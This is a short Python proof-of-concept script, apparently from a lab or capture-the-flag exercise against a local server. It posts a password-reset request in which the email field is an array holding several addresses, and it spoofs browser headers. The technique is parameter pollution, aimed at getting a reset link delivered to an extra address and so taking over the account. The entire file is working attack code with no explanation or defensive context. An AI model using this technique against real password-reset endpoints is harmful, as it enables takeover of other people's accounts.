import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

emails = ["poysa@gmail.com", "admin@proton.me", "poysa@gmail.com"]

def send_request(emails):
    boundary = "----WebKitFormBoundaryIjlgXHKTRNYLM0l9"
    
    # Construct multipart form-data
    fields = []
    for email in emails:
        fields.append(("email[]", email))
    
    encoder = MultipartEncoder(fields=fields, boundary=boundary)
    
    headers = {
        "Content-Type": encoder.content_type,
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Origin": "http://localhost:30001",
        "Referer": "http://localhost:30001/reset-password",
        "Connection": "keep-alive",
    }
    
    response = requests.post("http://localhost:30001/reset-password", 
                             data=encoder, 
                             headers=headers)
    
    print(response.text)

send_request(emails)
